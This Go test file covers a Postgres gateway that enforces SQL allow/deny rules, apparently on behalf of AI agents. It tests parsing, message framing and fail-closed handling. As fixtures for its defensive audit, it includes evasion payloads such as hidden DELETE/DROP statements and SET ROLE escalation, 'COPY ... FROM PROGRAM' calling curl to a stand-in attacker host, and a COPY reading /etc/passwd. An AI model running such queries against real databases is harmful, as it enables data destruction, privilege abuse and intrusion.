package endpoints

import (
	"bytes"
	"context"
	"encoding/binary"
	"io"
	"net"
	"strings"
	"testing"
	"time"

	"github.com/google/go-cmp/cmp"

	"github.com/denoland/clawpatrol/internal/config"
	"github.com/denoland/clawpatrol/internal/config/facet"
	"github.com/denoland/clawpatrol/internal/config/match"
	_ "github.com/denoland/clawpatrol/internal/config/plugins/credentials"
	_ "github.com/denoland/clawpatrol/internal/config/plugins/facets/sql"
	_ "github.com/denoland/clawpatrol/internal/config/plugins/rules"
	"github.com/denoland/clawpatrol/internal/config/runtime"
)

// TestParseSQL exercises the AST extractor that feeds the SQL
// matcher. Coverage focuses on the v14 use cases — banned verbs,
// secret-table reads, banned function calls — plus the
// fail-closed-on-parse-failure contract pgplex now opts into via
// the Unparseable flag.
func TestParseSQL(t *testing.T) {
	cases := []struct {
		name            string
		sql             string
		want            pgInfo
		wantUnparseable bool
	}{
		{
			name: "simple select",
			sql:  "SELECT id FROM users",
			want: pgInfo{
				Verb:      "select",
				Tables:    []string{"users"},
				Functions: nil,
				Statement: "SELECT id FROM users",
			},
		},
		{
			// AST extractor sorts tables alphabetically (map keys);
			// rule writers don't depend on order — the matcher uses
			// list-OR semantics over candidates.
			name: "select with multiple tables (join)",
			sql:  "SELECT u.id FROM users u JOIN tokens t ON t.user_id = u.id",
			want: pgInfo{
				Verb:      "select",
				Tables:    []string{"tokens", "users"},
				Functions: nil,
				Statement: "SELECT u.id FROM users u JOIN tokens t ON t.user_id = u.id",
			},
		},
		{
			// AST extractor only surfaces real function callsites —
			// VALUES, table-name + column-list parens etc. no longer
			// pollute the functions list.
			name: "insert with function",
			sql:  "INSERT INTO audit (ts, what) VALUES (now(), 'x')",
			want: pgInfo{
				Verb:      "insert",
				Tables:    []string{"audit"},
				Functions: []string{"now"},
				Statement: "INSERT INTO audit (ts, what) VALUES (now(), 'x')",
			},
		},
		{
			name: "banned function (pg_terminate_backend)",
			sql:  "SELECT pg_terminate_backend(123)",
			want: pgInfo{
				Verb:      "select",
				Tables:    nil,
				Functions: []string{"pg_terminate_backend"},
				Statement: "SELECT pg_terminate_backend(123)",
			},
		},
		{
			// COPY ... FROM PROGRAM is a postgres extension to the
			// SQL standard COPY. pgplex's grammar accepts it; the
			// matcher sees verb=copy, tables=[foo] and can deny on
			// either facet. (Parser-failure coverage lives in the
			// next case.)
			name: "COPY ... FROM PROGRAM parses to verb=copy",
			sql:  "COPY foo FROM PROGRAM 'curl evil.example'",
			want: pgInfo{
				Verb:      "copy",
				Tables:    []string{"foo"},
				Statement: "COPY foo FROM PROGRAM 'curl evil.example'",
			},
		},
		{
			// Trailing-`;` DDL shell — pgplex rejects `DROP` (no
			// target object). parseSQL takes the Unparseable path:
			// Statement preserved (sans the splitter-stripped `;`),
			// every other facet zero. The dispatcher's fail-closed
			// gate (config/runtime/dispatch.go) then synth-denies any
			// rule reading verb / tables / functions on this request.
			// Mirrors cl-myyc's clickhouse_native Unparseable parity.
			name: "trailing-semicolon DDL shell is unparseable",
			sql:  "DROP;",
			want: pgInfo{
				Statement: "DROP",
			},
			wantUnparseable: true,
		},
		{
			// Genuine garbage that pgplex can't tokenize → same
			// Unparseable shape.
			name: "syntax garbage is unparseable",
			sql:  "###@@@???",
			want: pgInfo{
				Statement: "###@@@???",
			},
			wantUnparseable: true,
		},
		{
			name: "empty sql returns empty info",
			sql:  "",
			want: pgInfo{},
		},
		{
			// parseSQL is single-statement (per the ParseStatement
			// plugin contract); multi-statement Q payloads are
			// walked by the wire-protocol gateway via analyseAll.
			// The first top-level statement is what comes back.
			name: "multi-statement returns first statement",
			sql:  "SELECT * FROM users; DELETE FROM sessions",
			want: pgInfo{
				Verb:      "select",
				Tables:    []string{"users"},
				Functions: nil,
				Statement: "SELECT * FROM users",
			},
		},
		{
			// §2.3: schema-qualified names emit both the qualified
			// form and the unqualified leaf so rules written either
			// way still catch the read. Order: alphabetical.
			name: "schema-qualified table",
			sql:  "SELECT * FROM audit.secret_tokens",
			want: pgInfo{
				Verb:      "select",
				Tables:    []string{"audit.secret_tokens", "secret_tokens"},
				Functions: nil,
				Statement: "SELECT * FROM audit.secret_tokens",
			},
		},
		{
			// §2.4: quoted identifiers are captured with case
			// preserved, matching postgres' case-sensitive treatment
			// of "Foo" vs Foo / foo.
			name: "quoted identifier is captured case-sensitively",
			sql:  "SELECT * FROM \"Sensitive Table\"",
			want: pgInfo{
				Verb:      "select",
				Tables:    []string{"Sensitive Table"},
				Functions: nil,
				Statement: "SELECT * FROM \"Sensitive Table\"",
			},
		},
		{
			// #658: psql's `\d` family orders catalog reads by a bare
			// `COLLATE pg_catalog.default`, which the pgplex grammar
			// refuses unless `default` is quoted. normalizeParserGaps
			// requotes it on a retry copy so the statement parses; the
			// Statement field still reflects the original wire text.
			name: "psql \\d-style COLLATE pg_catalog.default parses",
			sql:  "SELECT c.relname FROM pg_catalog.pg_class c ORDER BY c.relname COLLATE pg_catalog.default",
			want: pgInfo{
				Verb:      "select",
				Tables:    []string{"pg_catalog.pg_class", "pg_class"},
				Functions: nil,
				Statement: "SELECT c.relname FROM pg_catalog.pg_class c ORDER BY c.relname COLLATE pg_catalog.default",
			},
		},
		{
			// Bare `COLLATE default` (no schema qualifier) is the same
			// gap and takes the same retry path.
			name: "bare COLLATE default parses",
			sql:  "SELECT n FROM t ORDER BY n COLLATE default",
			want: pgInfo{
				Verb:      "select",
				Tables:    []string{"t"},
				Functions: nil,
				Statement: "SELECT n FROM t ORDER BY n COLLATE default",
			},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, unparseable := parseSQL(tc.sql)
			if diff := cmp.Diff(tc.want, got); diff != "" {
				t.Errorf("parseSQL mismatch (-want +got):\n%s", diff)
			}
			if unparseable != tc.wantUnparseable {
				t.Errorf("unparseable = %v, want %v", unparseable, tc.wantUnparseable)
			}
		})
	}
}

// TestPgMessageFraming round-trips a Q message through readPgMessage
// + serializePgMessage to confirm the wire-protocol framing matches
// what the upstream postgres expects.
func TestPgMessageFraming(t *testing.T) {
	original := pgMessage{typ: 'Q', payload: []byte("SELECT 1\x00")}
	wire := serializePgMessage(original)

	parsed, rest, ok := readPgMessage(wire)
	if !ok {
		t.Fatalf("readPgMessage returned ok=false on round-trip")
	}
	if len(rest) != 0 {
		t.Errorf("expected empty rest, got %d bytes", len(rest))
	}
	if parsed.typ != original.typ {
		t.Errorf("typ=%c want %c", parsed.typ, original.typ)
	}
	if string(parsed.payload) != string(original.payload) {
		t.Errorf("payload=%q want %q", parsed.payload, original.payload)
	}
}

func TestPgMessageFramingRejectsIncompleteOrMalformedPackets(t *testing.T) {
	cases := []struct {
		name string
		wire []byte
	}{
		{name: "partial header", wire: []byte{'Q', 0, 0}},
		{name: "invalid length below minimum", wire: []byte{'Q', 0, 0, 0, 3}},
		{name: "declared payload not fully buffered", wire: []byte{'Q', 0, 0, 0, 9, 'S', 'E'}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, rest, ok := readPgMessage(tc.wire)
			if ok {
				t.Fatalf("readPgMessage(%v) returned ok=true", tc.wire)
			}
			if string(rest) != string(tc.wire) {
				t.Fatalf("readPgMessage should preserve buffered bytes; got %v want %v", rest, tc.wire)
			}
		})
	}
}

// TestPgExtractSQL confirms the SQL pulled out of Q (terminated
// string) and P (stmt-name \0 query \0) matches the legacy extractor.
func TestPgExtractSQL(t *testing.T) {
	if got := pgExtractSQL('Q', []byte("SELECT 1\x00")); got != "SELECT 1" {
		t.Errorf("Q extract: %q", got)
	}
	if got := pgExtractSQL('P', []byte("stmt1\x00SELECT $1\x00\x00\x00")); got != "SELECT $1" {
		t.Errorf("P extract: %q", got)
	}
	if got := pgExtractSQL('B', []byte("ignored")); got != "" {
		t.Errorf("non-Q/P extract should return empty, got %q", got)
	}
}

func TestPgClientToServerForwardsQueryMessage(t *testing.T) {
	agent, gateway, upstream, upstreamPeer, cleanup := pgPumpTestPipes(t)
	defer cleanup()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go pgClientToServer(ctx, &runtime.ConnHandle{Conn: gateway}, upstream, "", "")

	wire := serializePgMessage(pgMessage{typ: 'Q', payload: []byte("SELECT 1\x00")})
	go func() { _, _ = agent.Write(wire) }()

	got := readFullWithDeadline(t, upstreamPeer, len(wire))
	if !bytes.Equal(got, wire) {
		t.Fatalf("forwarded bytes = %v, want %v", got, wire)
	}
}

func TestPgClientToServerDeniesQueryMessage(t *testing.T) {
	agent, gateway, upstream, upstreamPeer, cleanup := pgPumpTestPipes(t)
	defer cleanup()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	ch := &runtime.ConnHandle{
		Conn: gateway,
		Endpoint: &config.CompiledEndpoint{Rules: []*config.CompiledRule{{
			Outcome: config.Outcome{Verdict: "deny", Reason: "blocked"},
		}}},
	}
	go pgClientToServer(ctx, ch, upstream, "", "")

	wire := serializePgMessage(pgMessage{typ: 'Q', payload: []byte("DROP TABLE users\x00")})
	go func() { _, _ = agent.Write(wire) }()
	_ = readFullWithDeadline(t, agent, 5) // ErrorResponse header; unblocks pgWriteDeny.

	_ = upstreamPeer.SetReadDeadline(time.Now().Add(50 * time.Millisecond))
	buf := make([]byte, 1)
	if n, err := upstreamPeer.Read(buf); err == nil || n != 0 {
		t.Fatalf("upstream received denied query bytes: n=%d err=%v", n, err)
	}
}

func TestPgClientToServerForwardsNonInspectedMessage(t *testing.T) {
	agent, gateway, upstream, upstreamPeer, cleanup := pgPumpTestPipes(t)
	defer cleanup()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go pgClientToServer(ctx, &runtime.ConnHandle{Conn: gateway}, upstream, "", "")

	wire := serializePgMessage(pgMessage{typ: 'B', payload: []byte("portal\x00stmt\x00\x00\x00")})
	go func() { _, _ = agent.Write(wire) }()

	got := readFullWithDeadline(t, upstreamPeer, len(wire))
	if !bytes.Equal(got, wire) {
		t.Fatalf("forwarded bytes = %v, want %v", got, wire)
	}
}

func TestPgClientToServerForwardsPartialFrame(t *testing.T) {
	agent, gateway, upstream, upstreamPeer, cleanup := pgPumpTestPipes(t)
	defer cleanup()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go pgClientToServer(ctx, &runtime.ConnHandle{Conn: gateway}, upstream, "", "")

	wire := serializePgMessage(pgMessage{typ: 'Q', payload: []byte("SELECT 1\x00")})
	go func() {
		_, _ = agent.Write(wire[:3])
		time.Sleep(10 * time.Millisecond)
		_, _ = agent.Write(wire[3:])
	}()

	got := readFullWithDeadline(t, upstreamPeer, len(wire))
	if !bytes.Equal(got, wire) {
		t.Fatalf("forwarded bytes = %v, want %v", got, wire)
	}
}

func TestPgClientToServerForwardsMultipleFramesFromOneRead(t *testing.T) {
	agent, gateway, upstream, upstreamPeer, cleanup := pgPumpTestPipes(t)
	defer cleanup()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go pgClientToServer(ctx, &runtime.ConnHandle{Conn: gateway}, upstream, "", "")

	q := serializePgMessage(pgMessage{typ: 'Q', payload: []byte("SELECT 1\x00")})
	syncMsg := serializePgMessage(pgMessage{typ: 'S'})
	wire := append(append([]byte{}, q...), syncMsg...)
	go func() { _, _ = agent.Write(wire) }()

	got := readFullWithDeadline(t, upstreamPeer, len(wire))
	if !bytes.Equal(got, wire) {
		t.Fatalf("forwarded bytes = %v, want %v", got, wire)
	}
}

func pgPumpTestPipes(t *testing.T) (agent, gateway, upstream, upstreamPeer net.Conn, cleanup func()) {
	t.Helper()
	agent, gateway = net.Pipe()
	upstream, upstreamPeer = net.Pipe()
	cleanup = func() {
		_ = agent.Close()
		_ = gateway.Close()
		_ = upstream.Close()
		_ = upstreamPeer.Close()
	}
	return agent, gateway, upstream, upstreamPeer, cleanup
}

func readFullWithDeadline(t *testing.T, c net.Conn, n int) []byte {
	t.Helper()
	_ = c.SetReadDeadline(time.Now().Add(time.Second))
	buf := make([]byte, n)
	if _, err := io.ReadFull(c, buf); err != nil {
		t.Fatalf("read %d bytes: %v", n, err)
	}
	return buf
}

func TestPgClientToServerReturnsOnContextCancel(t *testing.T) {
	agent, gateway := net.Pipe()
	defer func() { _ = agent.Close() }()
	upstream, upstreamPeer := net.Pipe()
	defer func() { _ = upstream.Close() }()
	defer func() { _ = upstreamPeer.Close() }()

	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan struct{})
	go func() {
		defer close(done)
		pgClientToServer(ctx, &runtime.ConnHandle{Conn: gateway}, upstream, "", "")
	}()

	cancel()
	select {
	case <-done:
	case <-time.After(time.Second):
		t.Fatal("pgClientToServer did not return after context cancellation")
	}
}

// pgEndpointFromHCL compiles a single postgres endpoint out of HCL
// so the truncation tests can construct a real *CompiledEndpoint
// whose rules carry CEL-backed matchers (their
// InspectsTruncatableFacet() answers are what drive the fail-close
// path). Plain literal CompiledEndpoints with nil matchers can't
// exercise that surface.
// testGatewayPrefix is the minimal valid `gateway {}` block needed
// to satisfy loader-level operational validation; these runtime
// tests care only about the policy blocks they declare.
const testGatewayPrefix = `gateway {
  state_dir  = "/opt/clawpatrol"
  public_url = "https://gw.example.test"
  wireguard { subnet_cidr = "10.55.0.0/24" }
}

`

func pgEndpointFromHCL(t *testing.T, src string) *config.CompiledEndpoint {
	t.Helper()
	gw, diags := config.LoadBytes([]byte(testGatewayPrefix+src), "in.hcl")
	if diags.HasErrors() {
		t.Fatalf("load: %v", diags)
	}
	cp, err := config.Compile(gw)
	if err != nil {
		t.Fatalf("compile: %v", err)
	}
	for _, ep := range cp.Endpoints {
		return ep
	}
	t.Fatalf("compileFixture produced no endpoints")
	return nil
}

// TestPgClientToServerDeniesOversizeFrameWhenRuleReadsTruncatableFacet
// pins the fail-closed path for postgres frame truncation. An agent
// emits a Q with a declared length far past maxPgMessage; the
// endpoint has a rule reading sql.verb so the dispatcher synthesizes
// a deny. The gateway must (a) send ErrorResponse + ReadyForQuery to
// the agent, (b) drain the oversized body bytes off the wire, (c)
// write nothing to upstream.
func TestPgClientToServerDeniesOversizeFrameWhenRuleReadsTruncatableFacet(t *testing.T) {
	ep := pgEndpointFromHCL(t, `
endpoint "postgres" "db" {
  host = "db.example.com:5432"
}
credential "postgres_credential" "db-cred" { endpoint = postgres.db }
profile "default" { credentials = [postgres_credential.db-cred] }

rule "verb-allow" {
  endpoint  = postgres.db
  condition = "sql.verb == 'select'"
  verdict   = "allow"
}
rule "default-deny" {
  endpoint = postgres.db
  priority = -100
  verdict  = "deny"
}
`)

	agent, gateway, upstream, upstreamPeer, cleanup := pgPumpTestPipes(t)
	defer cleanup()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	ch := &runtime.ConnHandle{Conn: gateway, Endpoint: ep}
	go pgClientToServer(ctx, ch, upstream, "", "")

	// Declare a Q frame whose length exceeds maxPgMessage. We send
	// the header followed by a small "body" that exercises the
	// drain path — the gateway must read past whatever we send for
	// the declared length before signalling deny, but for the test
	// we cap the wire so the drain hits its source-EOF cleanly.
	oversize := uint32(maxPgMessage + 16)
	header := []byte{'Q', 0, 0, 0, 0}
	binary.BigEndian.PutUint32(header[1:5], oversize)
	bodyPrefix := bytes.Repeat([]byte{'X'}, 8)
	go func() {
		_, _ = agent.Write(header)
		_, _ = agent.Write(bodyPrefix)
		// The remaining bytes the gateway will try to drain — fill
		// them with deterministic noise so the drain has something
		// to consume. We send exactly the declared remainder.
		drain := int(oversize) - 4 - len(bodyPrefix)
		_, _ = agent.Write(bytes.Repeat([]byte{'Y'}, drain))
	}()

	// ErrorResponse arrives on the agent side. Read at least its
	// 5-byte header to unblock the deny path.
	_ = readFullWithDeadline(t, agent, 5)

	// Upstream must see zero bytes for this denied frame.
	_ = upstreamPeer.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
	buf := make([]byte, 1)
	if n, err := upstreamPeer.Read(buf); err == nil || n != 0 {
		t.Fatalf("upstream received bytes from denied oversize frame: n=%d err=%v", n, err)
	}
}

// TestPgClientToServerForwardsOversizeFrameWhenNoRuleReadsTruncatableFacet
// pins the OTHER half: an oversize Q frame on an endpoint whose
// rules never touch sql.* is forwarded byte-for-byte to upstream.
// The gateway can't inspect what it didn't buffer, but it must not
// silently drop traffic the policy didn't ask it to drop.
func TestPgClientToServerForwardsOversizeFrameWhenNoRuleReadsTruncatableFacet(t *testing.T) {
	ep := pgEndpointFromHCL(t, `
endpoint "postgres" "db" {
  host = "db.example.com:5432"
}
credential "bearer_token" "cred" { endpoint = postgres.db }
profile "default" { credentials = [bearer_token.cred] }

rule "by-credential" {
  endpoint   = postgres.db
  credential = bearer_token.cred
  verdict    = "allow"
}
`)

	agent, gateway, upstream, upstreamPeer, cleanup := pgPumpTestPipes(t)
	defer cleanup()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	ch := &runtime.ConnHandle{Conn: gateway, Endpoint: ep}
	go pgClientToServer(ctx, ch, upstream, "cred", "")

	oversize := uint32(maxPgMessage + 8)
	header := []byte{'Q', 0, 0, 0, 0}
	binary.BigEndian.PutUint32(header[1:5], oversize)
	bodyLen := int(oversize) - 4
	body := bytes.Repeat([]byte{'Z'}, bodyLen)
	go func() {
		_, _ = agent.Write(header)
		_, _ = agent.Write(body)
	}()

	got := readFullWithDeadline(t, upstreamPeer, 1+int(oversize))
	if got[0] != 'Q' {
		t.Fatalf("upstream byte[0] = %c, want Q", got[0])
	}
	if !bytes.Equal(got[5:], body) {
		t.Fatalf("upstream body diverged: len=%d want=%d", len(got)-5, len(body))
	}
}

// TestParseSQL_Audit143 covers the in-scope (FN, evasion) findings
// from denoland/clawpatrol#143. Each case fires the audit's payload
// against parseSQL and asserts the matcher input now surfaces the
// data the evading rule needed.
//
// parseSQL is the single-statement front door (ParseStatement
// plugin entry). Cases that depend on multi-statement /
// CTE-shadow / DO-shadow evaluation live in
// TestPgEvaluate_Audit143 below — they need the wire-protocol-side
// analyseAll walk.
func TestParseSQL_Audit143(t *testing.T) {
	cases := []struct {
		name       string
		sql        string
		wantVerb   string
		wantTables []string
	}{
		// §1.1 Trailing-semicolon / no-whitespace verbs no longer
		// fold the punctuation into the verb token. The DDL-shell
		// case (`DROP;` with no target) routes through the
		// Unparseable contract — pgplex refuses it, so a verb-keyed
		// rule fail-closes via the dispatcher's Unparseable gate
		// instead of trying to evaluate against `verb="drop"`.
		// Dedicated coverage in TestParseSQL above.
		{"§1.1 BEGIN;", "BEGIN;", "begin", nil},
		{"§1.1 SELECT*FROM x", "SELECT*FROM x", "select", []string{"x"}},
		{"§1.1 DELETE/*c*/FROM x", "DELETE/*c*/FROM x", "delete", []string{"x"}},
		{"§1.1 SELECT;", "SELECT;", "select", nil},

		// §1.4 Leading comment no longer becomes the verb.
		{"§1.4 leading -- line comment", "-- whatever\nDROP TABLE users", "drop", []string{"users"}},
		{"§1.4 leading /* */ block comment", "/* x */ SELECT 1", "select", nil},
		{"§1.4 /*...*/DROP TABLE users", "/* x */DROP TABLE users", "drop", []string{"users"}},

		// §2.1 Bare-table DDL surfaces the table in `tables`.
		{"§2.1 DROP TABLE x", "DROP TABLE users", "drop", []string{"users"}},
		{"§2.1 TRUNCATE TABLE x", "TRUNCATE TABLE users", "truncate", []string{"users"}},
		{"§2.1 TRUNCATE x (no TABLE)", "TRUNCATE users", "truncate", []string{"users"}},
		{"§2.1 ALTER TABLE x", "ALTER TABLE users ADD COLUMN x int", "alter", []string{"users"}},
		{"§2.1 LOCK TABLE x", "LOCK TABLE users", "lock", []string{"users"}},
		{"§2.1 VACUUM x", "VACUUM users", "vacuum", []string{"users"}},
		{"§2.1 ANALYZE x", "ANALYZE users", "analyze", []string{"users"}},
		{"§2.1 REINDEX TABLE x", "REINDEX TABLE users", "reindex", []string{"users"}},
		{"§2.1 REFRESH MATERIALIZED VIEW x", "REFRESH MATERIALIZED VIEW users_mv", "refresh", []string{"users_mv"}},
		{"§2.1 CLUSTER x USING idx", "CLUSTER users USING idx", "cluster", []string{"users"}},
		{"§2.1 COMMENT ON TABLE x", "COMMENT ON TABLE users IS 'x'", "comment", []string{"users"}},
		{"§2.1 GRANT ALL ON TABLE x", "GRANT ALL ON TABLE users TO bob", "grant", []string{"users"}},
		{"§2.1 CREATE TABLE x", "CREATE TABLE users (id int)", "create", []string{"users"}},
		{"§2.1 CREATE TABLE IF NOT EXISTS x", "CREATE TABLE IF NOT EXISTS users (id int)", "create", []string{"users"}},
		{"§2.1 DROP TABLE IF EXISTS x", "DROP TABLE IF EXISTS users", "drop", []string{"users"}},

		// §2.2 COPY surfaces the source table, not the FROM token.
		// (Cockroach grammar accepts `COPY x FROM stdin` only; the
		// other forms route through the sniff fallback which still
		// extracts the table after COPY.)
		{"§2.2 COPY x FROM stdin", "COPY users FROM stdin", "copy", []string{"users"}},
		{"§2.2 COPY x TO stdout", "COPY users TO stdout", "copy", []string{"users"}},
		{"§2.2 COPY x(col) FROM 'file'", "COPY users (col1) FROM '/etc/passwd'", "copy", []string{"users"}},

		// §2.3 Schema-qualified names emit both forms.
		{"§2.3 FROM public.users", "SELECT * FROM public.users", "select", []string{"public.users", "users"}},
		{"§2.3 DROP TABLE public.users", "DROP TABLE public.users", "drop", []string{"public.users", "users"}},

		// §2.4 Quoted identifiers preserved case-sensitively.
		{"§2.4 FROM \"Users\"", "SELECT * FROM \"Users\"", "select", []string{"Users"}},
		{"§2.4 FROM public.\"Users\"", "SELECT * FROM public.\"Users\"", "select", []string{"Users", "public.Users"}},

		// §6.4 SET ROLE / SET SESSION AUTHORIZATION surface as
		// distinct verbs (sets the table for runtime ID tracking; at
		// minimum makes CEL `sql.verb == "set role"` precise).
		{"§6.4 SET ROLE", "SET ROLE admin", "set role", nil},
		{"§6.4 SET SESSION AUTHORIZATION", "SET SESSION AUTHORIZATION admin", "set session authorization", nil},
		{"§6.4 SET LOCAL ROLE", "SET LOCAL ROLE admin", "set local role", nil},

		// §1.2 CTE-hidden DML: cockroach's AST parses
		// `WITH x AS (DELETE …) SELECT …` as a *Select with a
		// WITH clause, so the outer verb is `select`. The inner
		// DELETE rides on analysedStmt.Inner — pgEvaluate walks it
		// so a `delete` rule still fires (see TestPgEvaluate).
		{"§1.2 WITH … (DELETE …) SELECT", "WITH x AS (DELETE FROM users RETURNING *) SELECT * FROM x", "select", []string{"users", "x"}},

		// §6.6 CALL <proc>: verb is `call`, proc name is captured
		// as a function. Body inspection is out of practical scope
		// (the proc body lives server-side and isn't on the wire),
		// but operators can still gate on `function = "..."`.
		{"§6.6 CALL proc", "CALL my_proc(1, 2)", "call", nil},

		// §2.6 (out of scope but free win): string literals don't
		// leak as ghost tables now that the tokenizer eats them
		// first.
		{"tokenizer ignores FROM inside string", "SELECT 'FROM users'", "select", nil},
		{"tokenizer ignores DELETE inside dollar quote", "SELECT $tag$ DELETE FROM users $tag$", "select", nil},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, _ := parseSQL(tc.sql)
			if got.Verb != tc.wantVerb {
				t.Errorf("Verb = %q, want %q", got.Verb, tc.wantVerb)
			}
			if diff := cmp.Diff(tc.wantTables, got.Tables); diff != "" {
				t.Errorf("Tables mismatch (-want +got):\n%s", diff)
			}
		})
	}
}

// TestPgEvaluate_Audit143 wires the matcher onto a stub endpoint
// and exercises the audit's payloads end-to-end — the dial-tone
// path the wire-protocol gateway uses. Covers the multi-statement
// / CTE-shadow / DO-shadow evasions that parseSQL alone can't
// (those need analyseAll to fan out).
func TestPgEvaluate_Audit143(t *testing.T) {
	denyAll := func(rule *config.CompiledRule) *runtime.ConnHandle {
		return &runtime.ConnHandle{
			Endpoint: &config.CompiledEndpoint{
				Name:   "pg-test",
				Family: "sql",
				Rules:  []*config.CompiledRule{rule},
			},
			Emit: func(runtime.ConnEvent) {},
		}
	}

	denyRule := func(reason string) *config.CompiledRule {
		// Compile a rule that matches everything (PassThrough) and
		// denies. Real rules would have a CEL match predicate, but
		// for these wiring tests the matcher firing on every input
		// is exactly what we want — the audit is about the *parser*
		// surfacing the inner statement so a real rule would fire,
		// which we model as "the inner walk reaches the matcher at
		// all."
		return &config.CompiledRule{
			Name:    "deny-all",
			Matcher: passThrough{},
			Outcome: config.Outcome{Verdict: "deny", Reason: reason},
		}
	}

	cases := []struct {
		name string
		sql  string
		// wantDeny: every case here must produce a deny verdict
		// because the inner walk reaches the matcher.
	}{
		// §1.3 Multi-statement Simple Query: each ;-statement is
		// walked, so a DELETE / DROP buried after a SELECT no longer
		// hides behind the first verb.
		{"§1.3 SELECT 1; DROP TABLE users", "SELECT 1; DROP TABLE users"},
		{"§1.3 SELECT 1; INSERT INTO admins", "SELECT 1; INSERT INTO admins(uid) VALUES (1)"},
		{"§1.3 BEGIN; DROP TABLE users; COMMIT", "BEGIN; DROP TABLE users; COMMIT"},

		// §1.2 CTE-hidden DML: the inner DELETE / UPDATE is a
		// shadow statement that hits the matcher.
		{"§1.2 WITH (DELETE …) SELECT", "WITH x AS (DELETE FROM users RETURNING *) SELECT * FROM x"},
		{"§1.2 WITH (UPDATE …) SELECT", "WITH d AS (UPDATE accounts SET balance = 0 RETURNING *) SELECT count(*) FROM d"},

		// §6.5 DO body: inner DROP is a shadow statement.
		{"§6.5 DO $$ DROP TABLE users $$", "DO $$ BEGIN DROP TABLE users; END $$"},

		// §6.4 + §1.3 compose: SET ROLE then DROP in one Q.
		{"§6.4 + §1.3", "SET ROLE admin; DROP TABLE users"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			ch := denyAll(denyRule("blocked"))
			v, _ := pgEvaluate(ch, tc.sql, "", "")
			if v != "deny" {
				t.Errorf("pgEvaluate(%q) verdict = %q, want deny", tc.sql, v)
			}
		})
	}
}

// passThrough is a match.Matcher that fires on every request — used
// in TestPgEvaluate_Audit143 to model "if the parser surfaces this
// statement to the matcher at all, the matcher will fire."
type passThrough struct{}

func (passThrough) Match(*match.Request) match.Decision {
	return match.Decision{Result: match.Matched}
}
func (passThrough) InspectsTruncatableFacet() bool { return false }

// TestPgEvaluateUnparseableSynthDeny exercises the postgres side of
// the Unparseable contract end-to-end: a request whose parser
// refused the bytes runs the wire pump's pgEvaluate against an
// endpoint with a verb-keyed rule. The matcher reads `sql.verb`,
// which is zero on the unparseable request, so the dispatcher's
// fail-closed-on-Unparseable gate (config/runtime/dispatch.go) must
// synth a deny — same shape clickhouse_native gets from parseChSQL's
// unparseable branch.
//
// Without postgres adopting the Unparseable flag, this test would
// see the matcher silently allow (verb="" against `verb == 'drop'`
// is false, no match → no rule fires → implicit allow). With the
// contract, the unparseable flag triggers the synth-deny path.
func TestPgEvaluateUnparseableSynthDeny(t *testing.T) {
	ep := pgEndpointFromHCL(t, `
endpoint "postgres" "db" {
  host = "db.example.com:5432"
}
credential "postgres_credential" "db-cred" { endpoint = postgres.db }
profile "default" { credentials = [postgres_credential.db-cred] }

rule "ban-drops" {
  endpoint  = postgres.db
  condition = "sql.verb == 'drop'"
  verdict   = "deny"
  reason    = "no drops"
}
`)
	ch := &runtime.ConnHandle{
		Endpoint: ep,
		Emit:     func(runtime.ConnEvent) {},
	}
	// `DROP;` is the trailing-semicolon shell — pgplex refuses it,
	// so analysePiece returns Unparseable=true and pgEvaluate stamps
	// the flag onto the match.Request.
	v, reason := pgEvaluate(ch, "DROP;", "", "")
	if v != "deny" {
		t.Fatalf("pgEvaluate(\"DROP;\") verdict = %q reason = %q, want deny", v, reason)
	}
	// The synth reason names the rule whose contract the unparseable
	// request broke and the cause the matcher reported.
	if !strings.Contains(reason, "ban-drops") || !strings.Contains(reason, "unparseable") {
		t.Errorf("reason = %q, want it to name the rule and mention 'unparseable'", reason)
	}
}

// TestPgEvaluateUnparseableLetsStatementOnlyRuleRun pins the other
// half of the contract: a rule that reads only `sql.statement` runs
// normally even when Unparseable=true, because the raw text IS
// populated on parse failure. Mirrors
// TestMatchRequestUnparseable_StatementRuleAllowsOnUnparseable in
// config/runtime/dispatch_test.go, but on the postgres runtime end.
func TestPgEvaluateUnparseableLetsStatementOnlyRuleRun(t *testing.T) {
	ep := pgEndpointFromHCL(t, `
endpoint "postgres" "db" {
  host = "db.example.com:5432"
}
credential "postgres_credential" "db-cred" { endpoint = postgres.db }
profile "default" { credentials = [postgres_credential.db-cred] }

rule "allow-known-shell" {
  endpoint  = postgres.db
  condition = "sql.statement.contains('DROP')"
  priority  = 100
  verdict   = "allow"
}
rule "ban-drops" {
  endpoint  = postgres.db
  condition = "sql.verb == 'drop'"
  priority  = 50
  verdict   = "deny"
  reason    = "no drops"
}
`)
	ch := &runtime.ConnHandle{
		Endpoint: ep,
		Emit:     func(runtime.ConnEvent) {},
	}
	v, reason := pgEvaluate(ch, "DROP;", "", "")
	if v != "" {
		t.Fatalf("pgEvaluate(\"DROP;\") verdict = %q reason = %q, want allow (no deny)", v, reason)
	}
}

// TestPgClientToServerDeniesFunctionCall closes §4.1's FunctionCall
// blind spot: the legacy 'F' fast-path carries no SQL text, so the
// gateway fails closed.
func TestPgClientToServerDeniesFunctionCall(t *testing.T) {
	agent, gateway, upstream, upstreamPeer, cleanup := pgPumpTestPipes(t)
	defer cleanup()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go pgClientToServer(ctx, &runtime.ConnHandle{Conn: gateway}, upstream, "", "")

	wire := serializePgMessage(pgMessage{typ: 'F', payload: []byte{0, 0, 0, 1, 0, 0}})
	go func() { _, _ = agent.Write(wire) }()
	_ = readFullWithDeadline(t, agent, 5) // ErrorResponse header

	_ = upstreamPeer.SetReadDeadline(time.Now().Add(50 * time.Millisecond))
	buf := make([]byte, 1)
	if n, err := upstreamPeer.Read(buf); err == nil || n != 0 {
		t.Fatalf("upstream received FunctionCall bytes: n=%d err=%v", n, err)
	}
}

